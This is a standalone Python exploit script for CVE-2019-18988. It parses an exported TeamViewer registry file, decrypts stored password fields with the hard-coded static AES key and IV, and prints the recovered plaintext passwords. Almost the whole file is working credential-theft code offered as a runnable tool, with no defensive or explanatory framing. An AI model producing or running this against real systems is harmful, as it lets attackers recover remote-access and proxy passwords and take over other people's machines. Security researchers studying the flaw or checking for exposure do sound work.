import sys
import re
from Crypto.Cipher import AES

# AES key and IV used by TeamViewer CVE-2019-18988
KEY = bytes([0x06, 0x02, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00,
             0x52, 0x53, 0x41, 0x31, 0x00, 0x04, 0x00, 0x00])
IV = bytes([0x01, 0x00, 0x01, 0x00, 0x67, 0x24, 0x4f, 0x43,
            0x6e, 0x67, 0x62, 0xf2, 0x5e, 0xa8, 0xd7, 0x04])

# Registry properties likely holding encrypted passwords
TARGET_FIELDS = [
    "SecurityPasswordAES",
    "OptionsPasswordAES",
    "SecurityPasswordExported",
    "ServerPasswordAES",
    "ProxyPasswordAES",
    "LicenseKeyAES"
]

def decrypt_teamviewer_password(encrypted_bytes):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    decrypted = cipher.decrypt(encrypted_bytes)
    # Remove trailing null bytes, decode utf-8 ignoring errors
    return decrypted.rstrip(b"\x00").decode("utf-8", errors="ignore")

def parse_reg_file(filename):
    results = []

    with open(filename, 'rb') as f:
        content = f.read()

    # Decode .reg file (usually UTF-16LE encoded)
    try:
        text = content.decode('utf-16le')
    except UnicodeDecodeError:
        text = content.decode('utf-8', errors='ignore')  # fallback

    for field in TARGET_FIELDS:
        pattern = fr'"{field}"=hex:(.+)'
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            # Remove continuation slashes and newlines in hex string
            hex_str = match.replace("\\\r\n", "").replace("\\\n", "")
            # Remove all chars except valid hex digits
            clean_hex = re.sub(r'[^0-9a-fA-F]', '', hex_str)
            if len(clean_hex) % 2 != 0:
                clean_hex = clean_hex[:-1]  # trim trailing odd char
            try:
                hex_bytes = bytes.fromhex(clean_hex)
                results.append((field, hex_bytes))
            except Exception as e:
                print(f"[!] Failed to convert hex for {field}: {e}")

    return results

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <teamviewer.reg>")
        sys.exit(1)

    filename = sys.argv[1]
    entries = parse_reg_file(filename)

    if not entries:
        print("[!] No encrypted TeamViewer values found.")
        return

    print(f"[+] Found {len(entries)} encrypted TeamViewer values:\n")
    for field, encrypted in entries:
        print(f"[*] {field}: {encrypted.hex()}")
        try:
            password = decrypt_teamviewer_password(encrypted)
            print(f"    [+] Decrypted: {password}\n")
        except Exception as e:
            print(f"    [!] Failed to decrypt: {e}\n")

if __name__ == "__main__":
    main()
